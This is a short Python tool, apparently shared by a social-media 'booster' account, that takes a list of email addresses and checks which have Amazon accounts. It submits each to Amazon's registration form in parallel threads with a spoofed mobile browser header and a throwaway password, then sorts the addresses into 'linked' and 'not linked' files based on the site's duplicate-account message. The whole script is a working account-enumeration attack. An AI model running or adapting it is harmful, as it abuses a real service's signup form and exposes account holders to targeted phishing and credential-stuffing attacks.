import requests
import time
import concurrent.futures

linked = open('amazonLinked.txt','a+') 
notLinked = open('amazonNotLinked.txt','a+')

websiteLink= "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
header= {
    'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'
    }
text = "You indicated you are a new customer, but an account already exists with the e-mail"



def check(email):
    session = requests.session()
    web = session.get(websiteLink,headers=header)
    data = {
        'customerName':'Androsex',
        'email': email,
        'emailCheck': email,
        'password':'anypasswordrandom',
        'passwordCheck':'anypasswordrandom'
        }
    response = session.post(websiteLink,headers=header,data=data).text
    if text in response:
        print("[+]"+email+" is Linked")
        linked.write(email+"\n")
    else:
        print("[-]"+email+" is NOT Linked")
        notLinked.write(email+"\n")

print("""
                                            ______                 _ _   _      _       _            _ 
     /\                                    |  ____|               (_) | | |    (_)     | |          | |
    /  \   _ __ ___   __ _ _______  _ __   | |__   _ __ ___   __ _ _| | | |     _ _ __ | | _____  __| |
   / /\ \ | '_ ` _ \ / _` |_  / _ \| '_ \  |  __| | '_ ` _ \ / _` | | | | |    | | '_ \| |/ / _ \/ _` |
  / ____ \| | | | | | (_| |/ / (_) | | | | | |____| | | | | | (_| | | | | |____| | | | |   <  __/ (_| |
 /_/    \_\_| |_| |_|\__,_/___\___/|_| |_| |______|_| |_| |_|\__,_|_|_| |______|_|_| |_|_|\_\___|\__,_|
                 CREDITS INSTAGRAM: socialmediaboosterlb TELEGRAM: socialmediaboosterlb
""")
time.sleep(.5)

with open('emails.txt', 'r') as f:
    emails = [line.strip() for line in f]

lol = input("press Enter to start checking")

with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(check,emails)